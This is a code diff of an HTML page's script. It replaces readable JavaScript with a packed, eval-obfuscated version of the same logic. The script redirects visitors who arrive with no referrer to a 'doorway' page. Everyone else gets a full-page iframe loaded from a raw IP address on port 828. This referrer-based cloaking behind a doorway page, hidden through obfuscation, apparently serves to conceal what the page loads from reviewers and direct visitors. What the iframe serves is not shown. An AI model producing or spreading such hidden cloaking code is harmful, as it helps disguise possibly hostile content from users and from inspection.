@@ -24,42 +24,8 @@
     
    
      <script type="text/javascript">
-         var ref = document.referrer;
-         if (ref == "") {
-             window.location.href = "https://alien-zhou.github.io/html5Camera/doorway.html";
-           
-         }else{
-         document.write('<iframe scrolling="auto" id="main" name="main" frameborder="0" src="http://119.23.234.151:828/wwwroot/client.html" style="min-height:600px;width:100%;height:100%;margin:0px; padding:0px;"></iframe>');
-         }
-         var url = "";
-         function iframeonload(ifr) {
-           // ifr.postMessage("getheight", url);
-         }
-         window.addEventListener('message', function (event) {
-             
-             console.info(event.origin + "_" + event.data);
-             $("#main").height(event.data);
-             
-         });
+         eval(function (p, a, c, k, e, d) { e = function (c) { return (c < a ? "" : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; if (!''.replace(/^/, String)) { while (c--) d[e(c)] = k[c] || e(c); k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1; }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p; }('5 g=6.m;j(g==""){9.w.z="A://y-x.E.F/D/B.d"}6.C(\'<1 v="p" n="3" q="3" t="0" k="u://o.s.r.G:T/U/R.d" S="V-a:Z;Y:c%;a:c%;W:b; X:b;"></1>\');5 l="";2 8(7){}9.Q(\'J\',2(4){K.H(4.I+"L"+4.f);$("#3").a(4.f)});$(6).O(2(e){5 1=6.P("3");l=1.k;5 7=9.M[0];j(1.i){1.i("h",2(){8(7)})}N{1.h=2(){8(7)}}});', 62, 62, '|iframe|function|main|event|var|document|ifr|iframeonload|window|height|0px|100|html||data|ref|onload|attachEvent|if|src|url|referrer|id|119|auto|name|234|23|frameborder|http|scrolling|location|zhou|alien|href|https|doorway|write|html5Camera|github|io|151|info|origin|message|console|_|frames|else|ready|getElementById|addEventListener|client|style|828|wwwroot|min|margin|padding|width|600px'.split('|'), 0, {}))
           
-         $(document).ready(function(e){  
-             var iframe = document.getElementById("main");
-             url = iframe.src;
-             var  ifr = window.frames[0];
-             if (iframe.attachEvent) {    
-                 iframe.attachEvent("onload", function() {    
-                     //iframe加载完成后你需要进行的操作 
-                     iframeonload(ifr);
-                 });    
-             } else {    
-                 iframe.onload = function() {    
-                     //iframe加载完成后你需要进行的操作  
-                     iframeonload(ifr);
-                 };    
-             }    
-         });
-
-
     </script>
 
 </body>
